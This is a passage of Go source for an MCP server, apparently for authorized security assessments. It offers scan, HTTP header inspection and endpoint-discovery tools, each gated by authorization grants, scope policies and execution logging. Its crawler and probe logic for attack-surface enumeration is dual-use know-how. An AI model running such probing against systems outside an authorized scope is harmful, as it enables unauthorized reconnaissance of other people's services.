package main

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path"
	"regexp"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/mark3labs/mcp-go/mcp"
	"github.com/mark3labs/mcp-go/server"
	"github.com/maximhq/bifrost/core/authmanager"
	"github.com/maximhq/bifrost/core/scopepolicy"
)

type ExecutionRecord struct {
	Timestamp string `json:"timestamp"`
	Tool      string `json:"tool"`
	Target    string `json:"target"`
	Method    string `json:"method"`
	GrantID   string `json:"grant_id,omitempty"`
	Allowed   bool   `json:"allowed"`
	Details   string `json:"details"`
}

var (
	requestCount int64
	historyMu    sync.Mutex
	history      []ExecutionRecord
)

func recordExecution(tool, target, method, grantID string, allowed bool, details string) {
	historyMu.Lock()
	defer historyMu.Unlock()
	history = append(history, ExecutionRecord{
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Tool:      tool,
		Target:    target,
		Method:    method,
		GrantID:   grantID,
		Allowed:   allowed,
		Details:   details,
	})
}

// buildControlledClient validates request against Authorization Manager and returns ControlledHTTPClient.
func buildControlledClient(mgr *authmanager.Manager, args map[string]any, target, method string) (*authmanager.AuthorizationGrant, *http.Client, error) {
	grantID, _ := args["grant_id"].(string)
	assessmentID, _ := args["assessment_id"].(string)
	userID, _ := args["user_id"].(string)
	orgID, _ := args["org_id"].(string)

	if strings.TrimSpace(method) == "" {
		method = "GET"
	}
	method = strings.ToUpper(strings.TrimSpace(method))

	grant, err := mgr.ValidateRequest(authmanager.ValidationRequest{
		GrantID:             grantID,
		AssessmentID:        assessmentID,
		UserID:              userID,
		OrgID:               orgID,
		TargetURL:           target,
		Method:              method,
		ClientSuppliedScope: args,
	})
	if err != nil {
		return nil, nil, err
	}

	allowedCIDRs := append([]string{}, grant.AllowedCIDRs...)
	if grant.AuthorizedHost != "" && grant.AuthorizedHost != "127.0.0.1" && grant.AuthorizedHost != "localhost" {
		if ips, err := net.LookupIP(grant.AuthorizedHost); err == nil {
			for _, ip := range ips {
				if ip4 := ip.To4(); ip4 != nil {
					allowedCIDRs = append(allowedCIDRs, fmt.Sprintf("%s/32", ip4.String()))
				}
			}
		}
	}

	grantPolicy := scopepolicy.Policy{
		AllowedCIDRs:   allowedCIDRs,
		AllowedPorts:   grant.AllowedPorts,
		AllowedHosts:   []string{grant.AuthorizedHost, "127.0.0.1", "localhost"},
		AllowedPaths:   grant.AllowedPaths,
		BlockedPaths:   grant.BlockedPaths,
		AllowedMethods: grant.AllowedMethods,
		ReadOnlyMode:   false,
	}

	enforcer, err := scopepolicy.NewFineGrainedScopeEnforcer(grantPolicy)
	if err != nil {
		return nil, nil, fmt.Errorf("scope policy initialization error: %w", err)
	}

	client := scopepolicy.NewControlledHTTPClient(enforcer, true)
	return grant, client, nil
}

// isManagedPracticeLab determines if a target URL corresponds to the internal managed practice lab
// rather than an external assessment target. Automatic test account credential injection is strictly restricted
// to the practice lab environment.
func isManagedPracticeLab(targetURL string, grant *authmanager.AuthorizationGrant) bool {
	if grant != nil {
		if grant.AssessmentType == authmanager.AssessmentTypeManagedLab || grant.LabInstanceID != "" || grant.ContainerID != "" {
			return true
		}
		gHost := strings.ToLower(grant.AuthorizedHost)
		if strings.Contains(gHost, "platform-practice-lab") {
			return true
		}
	}
	u, err := url.Parse(targetURL)
	if err != nil {
		return false
	}
	host := strings.ToLower(u.Host)
	h := host
	if hHost, _, err := net.SplitHostPort(host); err == nil {
		h = hHost
	}
	if h == "platform-practice-lab" {
		return true
	}
	if (h == "127.0.0.1" || h == "localhost") && (u.Port() == "5000" || u.Port() == "3000") {
		return true
	}
	return false
}

// DiscoveredEndpoint tracks metadata, evidence, and scope status for an endpoint.
type DiscoveredEndpoint struct {
	Path          string `json:"path"`
	Method        string `json:"method"`
	Category      string `json:"category"`
	DiscoveryType string `json:"discovery_type"` // "HTML", "JS Bundle", "Form", "Explicit Path", "Baseline Route"
	SourceURL     string `json:"source_url"`
	Confidence    string `json:"confidence"` // "HIGH", "MEDIUM", "LOW"
	InScope       bool   `json:"in_scope"`
	Status        string `json:"status,omitempty"` // "ACCESSIBLE", "BLOCKED", "OUT_OF_SCOPE", "UNPROBED"
	StatusCode    int    `json:"status_code,omitempty"`
}

// classifyEndpoint categorizes an endpoint based on path evidence without hardcoding target-specific logic.
func classifyEndpoint(p string) string {
	low := strings.ToLower(p)
	if strings.Contains(low, "login") || strings.Contains(low, "logout") || strings.Contains(low, "signin") ||
		strings.Contains(low, "signout") || strings.Contains(low, "token") || strings.Contains(low, "oauth") ||
		strings.Contains(low, "register") || strings.Contains(low, "signup") || strings.Contains(low, "auth") ||
		strings.Contains(low, "password") || strings.Contains(low, "session") {
		return "Authentication"
	}
	if strings.Contains(low, "/user") || strings.Contains(low, "/users") || strings.Contains(low, "/account") ||
		strings.Contains(low, "/profile") || strings.Contains(low, "/whoami") || strings.Contains(low, "/identity") {
		return "User Management"
	}
	if strings.Contains(low, "basket") || strings.Contains(low, "cart") || strings.Contains(low, "order") ||
		strings.Contains(low, "checkout") || strings.Contains(low, "payment") || strings.Contains(low, "invoice") {
		return "Orders & Baskets"
	}
	if strings.Contains(low, "product") || strings.Contains(low, "products") || strings.Contains(low, "search") ||
		strings.Contains(low, "catalog") || strings.Contains(low, "item") || strings.Contains(low, "inventory") ||
		strings.Contains(low, "track") {
		return "Products & Search"
	}
	if strings.Contains(low, "admin") || strings.Contains(low, "version") || strings.Contains(low, "config") ||
		strings.Contains(low, "metrics") || strings.Contains(low, "health") || strings.Contains(low, "swagger") ||
		strings.Contains(low, "openapi") {
		return "Administrative Interfaces"
	}
	if strings.Contains(low, "file") || strings.Contains(low, "upload") || strings.Contains(low, "download") ||
		strings.Contains(low, "ftp") || strings.Contains(low, "assets") || strings.Contains(low, "public") ||
		strings.Contains(low, "export") || strings.Contains(low, "import") {
		return "Files & Storage"
	}
	if strings.HasPrefix(low, "/api/") || strings.HasPrefix(low, "/rest/") || strings.HasPrefix(low, "/v1/") ||
		strings.HasPrefix(low, "/v2/") || strings.Contains(low, "graphql") {
		return "General API Routes"
	}
	return "Other Discovered Resources"
}

// isGrantReadOnly checks if the grant restricts operations to passive read-only HTTP methods.
func isGrantReadOnly(grant *authmanager.AuthorizationGrant) bool {
	if len(grant.AllowedMethods) == 0 {
		return false
	}
	for _, m := range grant.AllowedMethods {
		upper := strings.ToUpper(strings.TrimSpace(m))
		if upper == "POST" || upper == "PUT" || upper == "DELETE" || upper == "PATCH" {
			return false
		}
	}
	return true
}

// cleanCandidatePath normalizes path strings and filters out static asset files.
func cleanCandidatePath(raw string) string {
	raw = strings.TrimSpace(raw)
	raw = strings.Trim(raw, `'"()[]{};,`)
	if raw == "" {
		return ""
	}
	if idx := strings.IndexAny(raw, "?#"); idx != -1 {
		raw = raw[:idx]
	}
	if !strings.HasPrefix(raw, "/") {
		raw = "/" + raw
	}
	if strings.ContainsAny(raw, " \t\r\n<>{}()\"'\\$") {
		return ""
	}
	low := strings.ToLower(raw)
	staticExts := []string{".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff", ".woff2", ".ttf", ".eot", ".map"}
	for _, ext := range staticExts {
		if strings.HasSuffix(low, ext) {
			return ""
		}
	}
	cleaned := path.Clean(raw)
	if cleaned == "." {
		return ""
	}
	return cleaned
}

// isPathInScope checks if a path is permitted by the authorization grant.
func isPathInScope(p string, allowedPaths, blockedPaths []string) bool {
	for _, bp := range blockedPaths {
		bp = strings.TrimSpace(bp)
		if bp == "" {
			continue
		}
		if bp == p || strings.HasPrefix(p, bp) || strings.HasPrefix(p+"/", bp) {
			return false
		}
	}
	if len(allowedPaths) == 0 {
		return true
	}
	for _, ap := range allowedPaths {
		ap = strings.TrimSpace(ap)
		if ap == "" || ap == "/" {
			return true
		}
		if ap == p || strings.HasPrefix(p, ap) || strings.HasPrefix(p+"/", ap) {
			return true
		}
	}
	return false
}

// isSameOrigin checks if targetURL and resourceURL share the same scheme, host, and port.
func isSameOrigin(base, target *url.URL) bool {
	if strings.ToLower(base.Scheme) != strings.ToLower(target.Scheme) {
		return false
	}
	if !strings.EqualFold(base.Hostname(), target.Hostname()) {
		return false
	}
	basePort := base.Port()
	if basePort == "" {
		if base.Scheme == "https" {
			basePort = "443"
		} else {
			basePort = "80"
		}
	}
	targetPort := target.Port()
	if targetPort == "" {
		if target.Scheme == "https" {
			targetPort = "443"
		} else {
			targetPort = "80"
		}
	}
	return basePort == targetPort
}

// extractFromHTML parses HTML content for links, scripts, forms, and relative endpoints.
func extractFromHTML(htmlContent, sourceURL string, baseURL *url.URL) ([]DiscoveredEndpoint, []string) {
	var endpoints []DiscoveredEndpoint
	var scriptURLs []string
	seen := make(map[string]bool)

	// 1. Scripts: <script[^>]+src=["']([^"']+)["']
	scriptRe := regexp.MustCompile(`(?i)<script[^>]+src=["']([^"']+)["']`)
	for _, m := range scriptRe.FindAllStringSubmatch(htmlContent, -1) {
		if len(m) > 1 {
			src := strings.TrimSpace(m[1])
			if src != "" {
				scriptURLs = append(scriptURLs, src)
			}
		}
	}

	// 2. Forms: <form[^>]*action=["']([^"']+)["'][^>]*> and method
	formRe := regexp.MustCompile(`(?i)<form\s+[^>]*action=["']([^"']+)["'][^>]*>`)
	methodRe := regexp.MustCompile(`(?i)method=["']([^"']+)["']`)
	for _, m := range formRe.FindAllStringSubmatch(htmlContent, -1) {
		if len(m) > 1 {
			action := cleanCandidatePath(m[1])
			if action != "" && !seen[action] {
				seen[action] = true
				method := "POST"
				if methodMatches := methodRe.FindStringSubmatch(m[0]); len(methodMatches) > 1 {
					method = strings.ToUpper(methodMatches[1])
				}
				endpoints = append(endpoints, DiscoveredEndpoint{
					Path:          action,
					Method:        method,
					Category:      classifyEndpoint(action),
					DiscoveryType: "Form",
					SourceURL:     sourceURL,
					Confidence:    "HIGH",
				})
			}
		}
	}

	// 3. Anchor links: <a[^>]+href=["']([^"']+)["']
	hrefRe := regexp.MustCompile(`(?i)<a[^>]+href=["']([^"']+)["']`)
	for _, m := range hrefRe.FindAllStringSubmatch(htmlContent, -1) {
		if len(m) > 1 {
			href := m[1]
			if strings.HasPrefix(href, "/") || (!strings.HasPrefix(href, "http://") && !strings.HasPrefix(href, "https://") && !strings.HasPrefix(href, "javascript:") && !strings.HasPrefix(href, "mailto:")) {
				p := cleanCandidatePath(href)
				if p != "" && !seen[p] {
					seen[p] = true
					endpoints = append(endpoints, DiscoveredEndpoint{
						Path:          p,
						Method:        "GET",
						Category:      classifyEndpoint(p),
						DiscoveryType: "HTML",
						SourceURL:     sourceURL,
						Confidence:    "HIGH",
					})
				}
			}
		}
	}

	// 4. API resource references
	dataApiRe := regexp.MustCompile(`(?i)(?:data-api|data-url|data-endpoint)=["']([^"']+)["']`)
	for _, m := range dataApiRe.FindAllStringSubmatch(htmlContent, -1) {
		if len(m) > 1 {
			p := cleanCandidatePath(m[1])
			if p != "" && !seen[p] {
				seen[p] = true
				endpoints = append(endpoints, DiscoveredEndpoint{
					Path:          p,
					Method:        "GET",
					Category:      classifyEndpoint(p),
					DiscoveryType: "HTML",
					SourceURL:     sourceURL,
					Confidence:    "HIGH",
				})
			}
		}
	}

	return endpoints, scriptURLs
}

// extractFromJavaScript parses JavaScript bundle text for API routes and endpoints without executing.
func extractFromJavaScript(jsContent, sourceURL string) []DiscoveredEndpoint {
	var endpoints []DiscoveredEndpoint
	seen := make(map[string]bool)

	// 1. HTTP method calls: .get('/path'), .post('/path'), $http.post('/path'), fetch('/path'), axios.get('/path')
	httpCallRe := regexp.MustCompile(`(?:\.(get|post|put|delete|patch)|\$http\.(get|post|put|delete|patch)|(?:fetch|axios(?:\.(get|post|put|delete|patch))?))\s*\(\s*["'](/[^"'\s\)\},]+)["']`)
	for _, m := range httpCallRe.FindAllStringSubmatch(jsContent, -1) {
		if len(m) > 4 {
			method := "GET"
			for i := 1; i <= 3; i++ {
				if m[i] != "" {
					method = strings.ToUpper(m[i])
					break
				}
			}
			p := cleanCandidatePath(m[4])
			if p != "" && !seen[p] {
				seen[p] = true
				endpoints = append(endpoints, DiscoveredEndpoint{
					Path:          p,
					Method:        method,
					Category:      classifyEndpoint(p),
					DiscoveryType: "JS Bundle",
					SourceURL:     sourceURL,
					Confidence:    "HIGH",
				})
			}
		}
	}

	// 2. Angular/React route paths: path: 'login', path: '/rest/user/login', api: '/rest/user/login'
	routerRe := regexp.MustCompile(`(?i)(?:path|api|endpoint|route|url)\s*:\s*["'](/?[a-zA-Z0-9_\-/\.:]+)["']`)
	for _, m := range routerRe.FindAllStringSubmatch(jsContent, -1) {
		if len(m) > 1 {
			raw := m[1]
			p := cleanCandidatePath(raw)
			if p != "" && !seen[p] && (strings.HasPrefix(p, "/api") || strings.HasPrefix(p, "/rest") || strings.HasPrefix(p, "/auth") || strings.HasPrefix(p, "/public") || strings.HasPrefix(p, "/assets") || strings.HasPrefix(p, "/ftp") || strings.Contains(p, "/")) {
				seen[p] = true
				endpoints = append(endpoints, DiscoveredEndpoint{
					Path:          p,
					Method:        "GET",
					Category:      classifyEndpoint(p),
					DiscoveryType: "JS Bundle",
					SourceURL:     sourceURL,
					Confidence:    "HIGH",
				})
			}
		}
	}

	// 3. Common REST & API string patterns: "/rest/...", "/api/...", "/auth/...", "/v1/..."
	apiPatternRe := regexp.MustCompile(`["']((?:/api/|/rest/|/auth/|/v[0-9]+/)[a-zA-Z0-9_\-/\.:]+)["']`)
	for _, m := range apiPatternRe.FindAllStringSubmatch(jsContent, -1) {
		if len(m) > 1 {
			p := cleanCandidatePath(m[1])
			if p != "" && !seen[p] {
				seen[p] = true
				endpoints = append(endpoints, DiscoveredEndpoint{
					Path:          p,
					Method:        "GET",
					Category:      classifyEndpoint(p),
					DiscoveryType: "JS Bundle",
					SourceURL:     sourceURL,
					Confidence:    "HIGH",
				})
			}
		}
	}

	// 4. Object literal endpoints map: { whoami: '/rest/user/whoami', login: '/rest/user/login' }
	objectEndpointsRe := regexp.MustCompile(`["'](/[a-zA-Z0-9_\-]+(?:/[a-zA-Z0-9_\-]+)+)["']`)
	for _, m := range objectEndpointsRe.FindAllStringSubmatch(jsContent, -1) {
		if len(m) > 1 {
			p := cleanCandidatePath(m[1])
			if p != "" && !seen[p] {
				if strings.HasPrefix(p, "/application/") || strings.HasPrefix(p, "/text/") || strings.HasPrefix(p, "/image/") {
					continue
				}
				seen[p] = true
				endpoints = append(endpoints, DiscoveredEndpoint{
					Path:          p,
					Method:        "GET",
					Category:      classifyEndpoint(p),
					DiscoveryType: "JS Bundle",
					SourceURL:     sourceURL,
					Confidence:    "MEDIUM",
				})
			}
		}
	}

	return endpoints
}

func main() {
	mgr := authmanager.GetGlobalManager()

	s := server.NewMCPServer(
		"mock-security-server",
		"1.0.0",
		server.WithToolCapabilities(true),
	)

	// TOOL 1: mock_scan (Baseline validation tool)
	toolMockScan := mcp.NewTool("mock_scan",
		mcp.WithDescription("Baseline controlled scan tool with fine-grained scope enforcement"),
		mcp.WithString("target", mcp.Required(), mcp.Description("Target URL or IP address")),
		mcp.WithString("method", mcp.Description("HTTP method (GET, HEAD, DELETE, etc.)")),
		mcp.WithString("grant_id", mcp.Description("Authoritative server-side authorization grant ID")),
		mcp.WithString("assessment_id", mcp.Description("Assessment ID")),
		mcp.WithString("user_id", mcp.Description("User ID")),
		mcp.WithString("org_id", mcp.Description("Organization ID")),
	)
	s.AddTool(toolMockScan, func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		atomic.AddInt64(&requestCount, 1)
		args := req.GetArguments()
		target, _ := args["target"].(string)
		method, _ := args["method"].(string)
		grantID, _ := args["grant_id"].(string)
		if strings.TrimSpace(method) == "" {
			method = "GET"
		}
		method = strings.ToUpper(strings.TrimSpace(method))

		grant, client, err := buildControlledClient(mgr, args, target, method)
		if err != nil {
			recordExecution("mock_scan", target, method, grantID, false, err.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Execution denied: %v", err)), nil
		}

		result, execErr := scopepolicy.ExecuteSafeRequest(client, method, target)
		if execErr != nil {
			recordExecution("mock_scan", target, method, grantID, false, execErr.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Execution failed: %v", execErr)), nil
		}

		recordExecution("mock_scan", target, method, grantID, true, fmt.Sprintf("HTTP %d %s", result.StatusCode, result.Status))
		output := fmt.Sprintf("Mock scan executed successfully on target: %s [%s %d %s]\nGrant ID: %s | Expiry: %s\nBody: %s",
			target, method, result.StatusCode, result.Status, grant.GrantID, grant.ExpiryTime.Format(time.RFC3339), result.Body)
		return mcp.NewToolResultText(output), nil
	})

	// TOOL 2: inspect_http (Detailed response & header inspection)
	toolInspectHTTP := mcp.NewTool("inspect_http",
		mcp.WithDescription("Inspects HTTP response, headers, cookies, and security configurations of an authorized target"),
		mcp.WithString("target", mcp.Required(), mcp.Description("Target URL")),
		mcp.WithString("method", mcp.Description("HTTP method (GET, HEAD, OPTIONS)")),
		mcp.WithString("grant_id", mcp.Description("Authoritative authorization grant ID")),
		mcp.WithString("assessment_id", mcp.Description("Assessment ID")),
		mcp.WithString("user_id", mcp.Description("User ID")),
		mcp.WithString("org_id", mcp.Description("Organization ID")),
	)
	s.AddTool(toolInspectHTTP, func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		atomic.AddInt64(&requestCount, 1)
		args := req.GetArguments()
		target, _ := args["target"].(string)
		method, _ := args["method"].(string)
		grantID, _ := args["grant_id"].(string)
		if strings.TrimSpace(method) == "" {
			method = "GET"
		}
		method = strings.ToUpper(strings.TrimSpace(method))

		grant, client, err := buildControlledClient(mgr, args, target, method)
		if err != nil {
			recordExecution("inspect_http", target, method, grantID, false, err.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Authorization denied: %v", err)), nil
		}

		httpReq, reqErr := http.NewRequestWithContext(ctx, method, target, nil)
		if reqErr != nil {
			return mcp.NewToolResultError(fmt.Sprintf("Malformed request: %v", reqErr)), nil
		}
		httpReq.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Authorized Controlled Assessment)")

		resp, respErr := client.Do(httpReq)
		if respErr != nil {
			recordExecution("inspect_http", target, method, grantID, false, respErr.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Request blocked or failed: %v", respErr)), nil
		}
		defer resp.Body.Close()

		bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
		bodySnippet := string(bodyBytes)
		if len(bodySnippet) > 1000 {
			bodySnippet = bodySnippet[:1000] + "... [truncated]"
		}

		// Security header checklist
		secHeaders := map[string]string{
			"Content-Security-Policy":   resp.Header.Get("Content-Security-Policy"),
			"X-Frame-Options":           resp.Header.Get("X-Frame-Options"),
			"X-Content-Type-Options":    resp.Header.Get("X-Content-Type-Options"),
			"Strict-Transport-Security": resp.Header.Get("Strict-Transport-Security"),
			"Access-Control-Allow-Origin": resp.Header.Get("Access-Control-Allow-Origin"),
			"Server":                    resp.Header.Get("Server"),
			"X-Powered-By":              resp.Header.Get("X-Powered-By"),
		}

		recordExecution("inspect_http", target, method, grantID, true, fmt.Sprintf("HTTP %d", resp.StatusCode))

		var b strings.Builder
		fmt.Fprintf(&b, "=== HTTP Inspection Report ===\n")
		fmt.Fprintf(&b, "Target: %s\nStatus: %d %s\nProtocol: %s\nGrant ID: %s\n\n", target, resp.StatusCode, resp.Status, resp.Proto, grant.GrantID)
		fmt.Fprintf(&b, "--- Security Headers Analysis ---\n")
		for k, v := range secHeaders {
			if v != "" {
				fmt.Fprintf(&b, "[PRESENT] %s: %s\n", k, v)
			} else {
				fmt.Fprintf(&b, "[MISSING] %s\n", k)
			}
		}
		fmt.Fprintf(&b, "\n--- All Response Headers ---\n")
		for k, v := range resp.Header {
			fmt.Fprintf(&b, "%s: %s\n", k, strings.Join(v, ", "))
		}
		fmt.Fprintf(&b, "\n--- Body Preview (%d bytes) ---\n%s\n", len(bodyBytes), bodySnippet)

		return mcp.NewToolResultText(b.String()), nil
	})

	// TOOL 3: discover_endpoints (Controlled Deep Endpoint & Attack Surface Enumeration)
	toolDiscover := mcp.NewTool("discover_endpoints",
		mcp.WithDescription("Performs deep in-scope endpoint and API route discovery by inspecting authorized HTML and same-origin JavaScript bundles"),
		mcp.WithString("target", mcp.Required(), mcp.Description("Target base URL (e.g. http://127.0.0.1:3005)")),
		mcp.WithString("paths", mcp.Description("Optional comma-separated list of additional specific paths to probe")),
		mcp.WithString("grant_id", mcp.Description("Authoritative authorization grant ID")),
		mcp.WithString("assessment_id", mcp.Description("Assessment ID")),
		mcp.WithString("user_id", mcp.Description("User ID")),
		mcp.WithString("org_id", mcp.Description("Organization ID")),
	)
	s.AddTool(toolDiscover, func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		atomic.AddInt64(&requestCount, 1)
		args := req.GetArguments()
		targetBase, _ := args["target"].(string)
		grantID, _ := args["grant_id"].(string)
		pathsArg, _ := args["paths"].(string)

		parsedBase, err := url.Parse(targetBase)
		if err != nil || parsedBase.Scheme == "" || parsedBase.Host == "" {
			return mcp.NewToolResultError("invalid target base URL"), nil
		}
		baseURL := fmt.Sprintf("%s://%s", parsedBase.Scheme, parsedBase.Host)

		// 1. Initial Authorization & Scope Validation for Target Base
		grant, rootClient, valErr := buildControlledClient(mgr, args, baseURL, "GET")
		if valErr != nil {
			recordExecution("discover_endpoints", baseURL, "GET", grantID, false, valErr.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Authorization denied for target: %v", valErr)), nil
		}
		if grant.IsRevoked {
			recordExecution("discover_endpoints", baseURL, "GET", grantID, false, "Grant is revoked")
			return mcp.NewToolResultError("Authorization denied: active grant is revoked"), nil
		}

		candidates := make(map[string]*DiscoveredEndpoint)
		var scriptSources []string
		resourcesCrawled := 0

		// Helper to merge candidate with deduplication & confidence resolution
		addCandidate := func(ep DiscoveredEndpoint) {
			p := cleanCandidatePath(ep.Path)
			if p == "" {
				return
			}
			ep.Path = p
			ep.Category = classifyEndpoint(p)
			ep.InScope = isPathInScope(p, grant.AllowedPaths, grant.BlockedPaths)

			if existing, ok := candidates[p]; ok {
				if ep.Confidence == "HIGH" || (ep.Confidence == "MEDIUM" && existing.Confidence == "LOW") {
					existing.Confidence = ep.Confidence
				}
				if ep.Method != "" && ep.Method != "GET" && existing.Method == "GET" {
					existing.Method = ep.Method
				}
				if existing.DiscoveryType == "Baseline Route" || ep.DiscoveryType == "Form" || ep.DiscoveryType == "JS Bundle" {
					existing.DiscoveryType = ep.DiscoveryType
					existing.SourceURL = ep.SourceURL
				}
			} else {
				candidates[p] = &ep
			}
		}

		// Always ensure root is a candidate
		addCandidate(DiscoveredEndpoint{
			Path:          "/",
			Method:        "GET",
			Category:      "General API Routes",
			DiscoveryType: "HTML",
			SourceURL:     baseURL,
			Confidence:    "HIGH",
		})

		// 2. Fetch Seed Homepage HTML (Bounded to 1MB)
		hReq, _ := http.NewRequestWithContext(ctx, "GET", baseURL+"/", nil)
		seedResp, seedErr := rootClient.Do(hReq)
		if seedErr == nil {
			resourcesCrawled++
			bodyBytes, _ := io.ReadAll(io.LimitReader(seedResp.Body, 1048576)) // 1MB max
			seedResp.Body.Close()
			bodyStr := string(bodyBytes)

			htmlEps, scripts := extractFromHTML(bodyStr, baseURL+"/", parsedBase)
			for _, ep := range htmlEps {
				addCandidate(ep)
			}
			scriptSources = append(scriptSources, scripts...)
		}

		// 3. Inspect Same-Origin JavaScript Bundles (Bounded to 10 bundles, 2MB each)
		seenBundles := make(map[string]bool)
		maxBundles := 10
		bundlesProcessed := 0

		var skippedExternalScripts []string
		var blockedRedirectScripts []string

		for _, src := range scriptSources {
			if bundlesProcessed >= maxBundles {
				break
			}
			scriptURL, parseErr := parsedBase.Parse(src)
			if parseErr != nil {
				continue
			}
			resolvedScriptStr := scriptURL.String()

			// EXTERNAL DOMAIN PROTECTION: Enforce same-origin or explicit CIDR grant
			if !isSameOrigin(parsedBase, scriptURL) {
				skippedExternalScripts = append(skippedExternalScripts, resolvedScriptStr)
				continue
			}

			// SCOPE PATH PROTECTION: Check if script path itself is blocked
			if !isPathInScope(scriptURL.Path, grant.AllowedPaths, grant.BlockedPaths) {
				continue
			}

			if seenBundles[resolvedScriptStr] {
				continue
			}
			seenBundles[resolvedScriptStr] = true

			// Fetch via ControlledHTTPClient (validates grant and intercepts redirects)
			_, bundleClient, bValErr := buildControlledClient(mgr, args, resolvedScriptStr, "GET")
			if bValErr != nil {
				continue
			}

			bReq, _ := http.NewRequestWithContext(ctx, "GET", resolvedScriptStr, nil)
			bResp, bErr := bundleClient.Do(bReq)
			if bErr != nil {
				blockedRedirectScripts = append(blockedRedirectScripts, fmt.Sprintf("%s (interception: %v)", resolvedScriptStr, bErr))
				continue
			}

			bundlesProcessed++
			resourcesCrawled++
			jsBytes, _ := io.ReadAll(io.LimitReader(bResp.Body, 2097152)) // 2MB max
			bResp.Body.Close()

			jsEps := extractFromJavaScript(string(jsBytes), scriptURL.Path)
			for _, ep := range jsEps {
				addCandidate(ep)
			}
		}

		// 4. Handle explicitly requested paths (if any) or standard fallback probes
		if strings.TrimSpace(pathsArg) != "" {
			for _, p := range strings.Split(pathsArg, ",") {
				p = strings.TrimSpace(p)
				if p != "" {
					addCandidate(DiscoveredEndpoint{
						Path:          p,
						Method:        "GET",
						Category:      classifyEndpoint(p),
						DiscoveryType: "Explicit Path",
						SourceURL:     "client_argument",
						Confidence:    "HIGH",
					})
				}
			}
		} else {
			// Ensure baseline fixtures are candidate paths if not discovered from JS
			baselinePaths := []string{
				"/rest/user/login",
				"/rest/basket/1",
				"/rest/admin/application-version",
				"/rest/products/search",
				"/api/Users",
				"/assets/public",
				"/ftp",
				"/forbidden/admin/",
			}
			for _, bp := range baselinePaths {
				addCandidate(DiscoveredEndpoint{
					Path:          bp,
					Method:        "GET",
					Category:      classifyEndpoint(bp),
					DiscoveryType: "Baseline Route",
					SourceURL:     baseURL,
					Confidence:    "MEDIUM",
				})
			}
		}

		// 5. Controlled Probing: Safely probe in-scope candidate endpoints
		var sortedPaths []string
		for p := range candidates {
			sortedPaths = append(sortedPaths, p)
		}
		sort.Strings(sortedPaths)

		var b strings.Builder
		fmt.Fprintf(&b, "=== In-Scope Endpoint Discovery ===\n")
		fmt.Fprintf(&b, "Base Target: %s\n", baseURL)
		fmt.Fprintf(&b, "Grant ID:    %s\n\n", grant.GrantID)

		discoveredCount := 0
		blockedCount := 0
		probesExecuted := 0
		maxProbes := 35

		fmt.Fprintf(&b, "--- Active Probing Results ---\n")
		for _, p := range sortedPaths {
			ep := candidates[p]
			fullURL := baseURL + ep.Path

			// Scope Check: Reject if not in allowed paths or is in blocked paths
			if !ep.InScope {
				ep.Status = "OUT_OF_SCOPE"
				blockedCount++
				fmt.Fprintf(&b, "[BLOCKED BY POLICY] %s: prohibited by grant scope policy\n", ep.Path)
				recordExecution("discover_endpoints", fullURL, "GET", grantID, false, "out of scope path")
				continue
			}

			if probesExecuted >= maxProbes {
				ep.Status = "UNPROBED_LIMIT"
				continue
			}

			// Enforce Restricted ROE (Read-Only Mode)
			probeMethod := "GET"
			if isGrantReadOnly(grant) && probeMethod != "GET" && probeMethod != "HEAD" {
				ep.Status = "RESTRICTED_ROE"
				blockedCount++
				fmt.Fprintf(&b, "[RESTRICTED ROE] %s: non-read-only method prohibited\n", ep.Path)
				continue
			}

			// Validate with Authorization Manager for each probe
			_, client, pValErr := buildControlledClient(mgr, args, fullURL, probeMethod)
			if pValErr != nil {
				fmt.Fprintf(&b, "[BLOCKED BY POLICY] %s: %v\n", ep.Path, pValErr)
				ep.Status = "BLOCKED"
				blockedCount++
				recordExecution("discover_endpoints", fullURL, probeMethod, grantID, false, pValErr.Error())
				continue
			}

			pReq, _ := http.NewRequestWithContext(ctx, probeMethod, fullURL, nil)
			pResp, pErr := client.Do(pReq)
			probesExecuted++

			if pErr != nil {
				fmt.Fprintf(&b, "[BLOCKED / ERROR] %s: %v\n", ep.Path, pErr)
				ep.Status = "BLOCKED"
				blockedCount++
				recordExecution("discover_endpoints", fullURL, probeMethod, grantID, false, pErr.Error())
				continue
			}

			ep.Status = "ACCESSIBLE"
			ep.StatusCode = pResp.StatusCode
			discoveredCount++
			contentType := pResp.Header.Get("Content-Type")
			fmt.Fprintf(&b, "[ACCESSIBLE] %s -> Status: %d %s | Type: %s | Content-Length: %d\n",
				ep.Path, pResp.StatusCode, pResp.Status, contentType, pResp.ContentLength)
			pResp.Body.Close()
			recordExecution("discover_endpoints", fullURL, probeMethod, grantID, true, fmt.Sprintf("HTTP %d", pResp.StatusCode))
		}

		// 6. Categorized Attack Surface Breakdown
		fmt.Fprintf(&b, "\n--- Discovered Attack Surface (by Category) ---\n")
		categories := []string{
			"Authentication",
			"User Management",
			"Products & Search",
			"Orders & Baskets",
			"Administrative Interfaces",
			"Files & Storage",
			"General API Routes",
			"Other Discovered Resources",
		}

		for _, cat := range categories {
			var catEndpoints []*DiscoveredEndpoint
			for _, p := range sortedPaths {
				if candidates[p].Category == cat {
					catEndpoints = append(catEndpoints, candidates[p])
				}
			}
			if len(catEndpoints) > 0 {
				fmt.Fprintf(&b, "[%s]\n", cat)
				for _, ep := range catEndpoints {
					inScopeStr := "YES"
					if !ep.InScope {
						inScopeStr = "NO (OUT OF SCOPE)"
					}
					fmt.Fprintf(&b, "  - %s (Method: %s, Source: %s, Type: %s, Confidence: %s, In-Scope: %s, Status: %s)\n",
						ep.Path, ep.Method, ep.SourceURL, ep.DiscoveryType, ep.Confidence, inScopeStr, ep.Status)
				}
			}
		}

		// Security Interceptions Summary
